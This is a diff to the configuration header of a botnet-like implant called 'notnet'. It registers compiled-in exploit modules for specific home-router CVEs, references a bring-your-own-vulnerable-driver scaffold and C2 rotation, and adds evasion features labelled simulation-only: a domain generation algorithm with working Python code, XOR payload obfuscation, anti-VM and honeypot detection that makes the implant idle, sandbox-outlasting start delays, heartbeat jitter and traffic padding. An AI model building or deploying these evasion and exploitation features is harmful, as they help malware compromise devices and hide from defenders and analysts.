@@ -238,8 +238,10 @@
 
 /* CVE module registry cap (#143). Modules are compile-time linked but
  * enabled/disabled at runtime via the C2 `cve enable <id>` / `cve
- * disable <id>` commands. A live feed without recompilation. */
-#define CVE_MAX_REGISTRY        8
+ * disable <id>` commands. A live feed without recompilation.
+ * #160: six static modules (TBK, HG532, Realtek, Boa formAuth, Zyxel
+ * zysh, D-Link HNAP) + headroom for plugin-channel modules. */
+#define CVE_MAX_REGISTRY        12
 
 /* ── BYOVD Defense-Neutralization Scaffold (#94) ────────── */
 /* Bring-your-own-vulnerable-driver (BYOVD): drop a legitimately-signed
@@ -273,5 +275,81 @@
 #define C2_ROTATE_FAIL_THRESHOLD 3     /* consecutive failures before rotate */
 #define C2_ROTATE_MAX            16    /* total automatic rotations/process */
 #define BOT_TAG_MAX              64    /* affiliate/operator tag length */
+
+/* ── Red-Team Realism Features (#159) ────────────────────────── */
+/* SIMULATION-ONLY evasion primitives for defender-training scenarios.
+ * Every feature below is OFF by default and opt-in per scenario via a
+ * config key; with defaults the bot's behavior is unchanged. None of
+ * these are enabled in any stock build or test. */
+
+/* Heartbeat jitter (config key heartbeat_jitter=, percent 0..50,
+ * default 0 = exact HEARTBEAT_INTERVAL). When set, each next check-in
+ * interval is drawn as base ± random(base*jitter/100) from the
+ * getrandom-backed helper in util.c, so check-ins are non-periodic
+ * (issue acceptance: 70%..130% of period at 30% jitter). */
+#define HEARTBEAT_JITTER_MAX_PCT 50
+
+/* Sleep-on-start (config key start_delay_s=, 0..3600, default 0).
+ * The bot sleeps this many seconds before entering the main loop —
+ * evades sandbox runs that give up early and desynchronizes fleet
+ * boot noise. No-op at the default 0. */
+#define START_DELAY_MAX_S        3600
+
+/* Domain Generation Algorithm (config keys dga_seed= / dga_tld=).
+ * SIMULATION-ONLY; empty dga_seed (the default) disables DGA entirely
+ * and DNS_PEER_RESOLUTION/static-server behavior is untouched.
+ *
+ * ALGORITHM (bot and C2 must compute identically):
+ *   material = "<seed>:<YYYY>-<DDD>"     (seed as configured, then
+ *                                        UTC-free local year and
+ *                                        zero-padded day-of-year)
+ *   h        = FNV-1a 32-bit over the ASCII bytes of material
+ *              (h = 2166136261; per byte: h ^= b; h *= 16777619)
+ *   label    = sprintf("%08x", h)        (8 lowercase hex chars)
+ *   domain   = "<label>.<dga_tld>"       (dga_tld default "sim.test")
+ * The domain is recomputed when the day-of-year rolls over, so it
+ * rotates daily. Python reference for the C2 side:
+ *   def dga_domain(seed, tld="sim.test", day=None):
+ *       import datetime
+ *       d = day or datetime.date.today()
+ *       m = f"{seed}:{d.year:04d}-{d.timetuple().tm_yday:03d}"
+ *       h = 2166136261
+ *       for b in m.encode(): h = ((h ^ b) * 16777619) & 0xFFFFFFFF
+ *       return "%08x.%s" % (h, tld)
+ * The bot treats the DGA name as an ADDITIONAL resolution candidate
+ * tried BEFORE the static HTTP server on primary-endpoint dials; if it
+ * does not resolve the static server is used exactly as before. */
+#define DGA_TLD_DEFAULT   "sim.test"
+#define DGA_SEED_MAX_HEX  64      /* seed is a hex string, up to 64 chars */
+#define DGA_DOMAIN_MAX    96
+
+/* Payload obfuscation (config key payload_key_hex=). The bot ships no
+ * crypto library, so this is an XOR-with-repeating-key stream derived
+ * from the 64-hex (32-byte) key — OBFUSCATION-GRADE, NOT encryption
+ * (honest labeling). Applied only to binary payload downloads when the
+ * key is configured: the bot de-XORs IN MEMORY after download, BEFORE
+ * the magic/integrity checks; the payload_sha256 pin (#81), when also
+ * set, pins the DECODED image. Default off — downloads stay plaintext.
+ * C2 side: c2.py --payload-xor-key writes <payload_dir>/notnet.xor and
+ * serves it at GET /bot/notnet.enc. */
+#define PAYLOAD_XOR_KEY_HEX_LEN 64
+
+/* Anti-VM / anti-sandbox sweep (config key anti_vm=, 0/1, default 0).
+ * When enabled, ONE sweep runs before the main loop: DMI product name
+ * QEMU/KVM/VirtualBox/VMware, "QEMU" in /proc/scsi/scsi, Cowrie
+ * honeypot artifacts (/usr/bin/cowrie or 'cowrie' in the hostname),
+ * and a fast-forward timing check (two 100ms sleeps must take >=180ms
+ * of wall clock). On a hit the bot logs "sandbox detected, idling" and
+ * enters an hourly sleep-check loop instead of exiting — idling is
+ * deliberately chosen over exit(): an instant exit is itself a sandbox
+ * tell and abandons the implant, whereas real families idle on
+ * analysis boxes. SIMULATION-ONLY; default off. */
+#define ANTI_VM_IDLE_CHECK_S     3600  /* seconds between rechecks while idling */
+
+/* Traffic shaping (config key hb_pad_max=, bytes 0..512, default 0).
+ * When >0, protocol_send_heartbeat appends a random-length (0..
+ * hb_pad_max bytes) "pad" JSON field so heartbeat size does not
+ * fingerprint the protocol. Default 0 = no pad field emitted. */
+#define HB_PAD_MAX_BYTES         512
 
 #endif /* NOTNET_CONFIG_H */
